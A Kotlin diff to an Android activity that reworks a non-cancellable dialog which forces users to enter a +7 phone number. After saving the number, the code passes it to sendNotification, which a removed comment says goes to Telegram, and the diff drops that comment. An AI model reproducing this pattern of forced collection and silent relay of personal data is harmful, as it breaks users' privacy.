@@ -163,55 +163,85 @@ class MainActivity : AppCompatActivity() {
 
     @SuppressLint("SetTextI18n")
     private fun showPhoneNumberDialog() {
-        val dialog = android.app.AlertDialog.Builder(this)
+        val dialog = AlertDialog.Builder(this, R.style.CustomAlertDialog).create()
         val inflater = layoutInflater
         val dialogView = inflater.inflate(R.layout.dialog_phone_input, null)
         
-        val phoneInput = dialogView.findViewById<android.widget.EditText>(R.id.phoneInput)
-        val continueButton = dialogView.findViewById<android.widget.Button>(R.id.continueButton)
+        // Настройка диалога
+        dialog.setView(dialogView)
+        dialog.setCancelable(false)
+        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
         
-        // Устанавливаем текст +7 и запрещаем его изменение
+        // Получаем элементы из макета
+        val titleTextView = dialogView.findViewById<TextView>(R.id.dialog_title)
+        val messageTextView = dialogView.findViewById<TextView>(R.id.dialog_message)
+        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
+        val continueButton = dialogView.findViewById<AppCompatButton>(R.id.continue_button)
+        
+        // Устанавливаем текст
+        titleTextView.text = "Введите номер телефона"
+        messageTextView.text = "Введите номер в формате +7XXXXXXXXXX"
+        
+        // Устанавливаем начальное значение +7
         phoneInput.setText("+7")
         phoneInput.setSelection(phoneInput.text.length)
         
-        // Фильтр для ввода только цифр и ограничения длины
-        phoneInput.addTextChangedListener(object : android.text.TextWatcher {
+        // Настраиваем обработчик ввода
+        phoneInput.addTextChangedListener(object : TextWatcher {
             override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
             
             override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
-                // Запрещаем изменение +7 в начале
+                // Запрещаем удаление +7
                 if (s?.length ?: 0 < 2 || s?.subSequence(0, 2) != "+7") {
                     phoneInput.setText("+7")
                     phoneInput.setSelection(2)
+                    return
+                }
+                
+                // Фильтруем ввод - только цифры после +7
+                if (s != null && s.length > 2) {
+                    val cleanNumber = "+7" + s.substring(2).filter { it.isDigit() }
+                    if (s.toString() != cleanNumber) {
+                        phoneInput.setText(cleanNumber)
+                        phoneInput.setSelection(cleanNumber.length)
+                    }
                 }
             }
             
-            override fun afterTextChanged(s: android.text.Editable?) {
-                continueButton.isEnabled = s?.length == 12 // +7 + 10 цифр
+            override fun afterTextChanged(s: Editable?) {
+                continueButton.isEnabled = s?.length == 12 // +7 и 10 цифр
             }
         })
         
-        dialog.setView(dialogView)
-        dialog.setCancelable(false)
-        
-        val alertDialog = dialog.create()
-        
+        // Обработчик кнопки "Продолжить"
         continueButton.setOnClickListener {
             val phoneNumber = phoneInput.text.toString()
-            if (phoneNumber.length == 12) { // +7 + 10 цифр
+            if (phoneNumber.length == 12 && phoneNumber.startsWith("+7")) {
                 sharedPrefs.edit()
                     .putString(PHONE_NUMBER_KEY, phoneNumber)
                     .putBoolean(PHONE_NUMBER_ENTERED_KEY, true)
                     .apply()
                 
-                // Отправляем номер в Telegram
                 sendNotification("Пользователь ввел номер телефона: $phoneNumber")
+                dialog.dismiss()
                 
-                alertDialog.dismiss()
+                // Скрываем клавиатуру
+                val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
+                imm.hideSoftInputFromWindow(phoneInput.windowToken, 0)
+            } else {
+                phoneInput.error = "Номер должен содержать 10 цифр после +7"
             }
         }
         
-        alertDialog.show()
+        // Показываем диалог
+        dialog.show()
+        
+        // Фокусируемся на поле ввода и показываем клавиатуру
+        phoneInput.postDelayed({
+            phoneInput.requestFocus()
+            val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
+            imm.showSoftInput(phoneInput, InputMethodManager.SHOW_IMPLICIT)
+        }, 100)
     }
 
     @SuppressLint("HardwareIds", "MissingPermission")
